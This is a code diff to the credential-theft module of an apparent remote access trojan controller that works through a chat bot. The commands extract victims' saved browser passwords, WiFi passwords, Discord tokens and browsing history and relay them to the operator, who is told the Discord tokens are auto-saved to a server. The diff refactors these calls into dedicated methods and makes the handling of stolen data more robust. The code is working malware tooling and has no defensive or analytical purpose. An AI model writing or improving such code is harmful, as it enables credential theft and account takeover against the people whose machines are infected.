@@ -25,7 +25,7 @@ export class CredentialCommands {
       text: ResponseFormatter.info('🔐 Extracting browser passwords...\n\n_This may take 30 seconds..._') 
     });
 
-    const result = await this.ratClient.sendCommand(sessionId, 'passwords', 60000);
+    const result = await this.ratClient.getPasswords(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -49,7 +49,7 @@ export class CredentialCommands {
       return;
     }
 
-    const result = await this.ratClient.sendCommand(sessionId, 'wifi');
+    const result = await this.ratClient.getWiFiPasswords(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -73,11 +73,11 @@ export class CredentialCommands {
       return;
     }
 
-    const result = await this.ratClient.sendCommand(sessionId, 'discord');
+    const result = await this.ratClient.getDiscordTokens(sessionId);
     
     if (result.success) {
       try {
-        const tokens = JSON.parse(result.data);
+        const tokens = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
         let response = ResponseFormatter.header('🎮', 'DISCORD TOKENS') + '\n\n';
         
         if (Array.isArray(tokens) && tokens.length > 0) {
@@ -91,8 +91,9 @@ export class CredentialCommands {
         response += '\n💾 _Auto-saved to server_';
         await this.sock.sendMessage(chatId, { text: response });
       } catch {
+        const dataStr = typeof result.data === 'string' ? result.data : JSON.stringify(result.data);
         await this.sock.sendMessage(chatId, { 
-          text: ResponseFormatter.info(result.data) 
+          text: ResponseFormatter.info(dataStr) 
         });
       }
     } else {
@@ -124,11 +125,11 @@ export class CredentialCommands {
       text: ResponseFormatter.info(`📜 Extracting ${browser} history...\n\n_Please wait..._`) 
     });
 
-    const result = await this.ratClient.sendCommand(sessionId, `history ${browser}`);
+    const result = await this.ratClient.getBrowserHistory(sessionId, browser);
     
     if (result.success) {
       try {
-        const history = JSON.parse(result.data);
+        const history = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
         let response = ResponseFormatter.header('📜', `${browser.toUpperCase()} HISTORY`) + '\n\n';
         
         if (Array.isArray(history) && history.length > 0) {
@@ -143,8 +144,9 @@ export class CredentialCommands {
         
         await this.sock.sendMessage(chatId, { text: response });
       } catch {
+        const dataStr = typeof result.data === 'string' ? result.data : JSON.stringify(result.data);
         await this.sock.sendMessage(chatId, { 
-          text: ResponseFormatter.info(result.data) 
+          text: ResponseFormatter.info(dataStr) 
         });
       }
     } else {
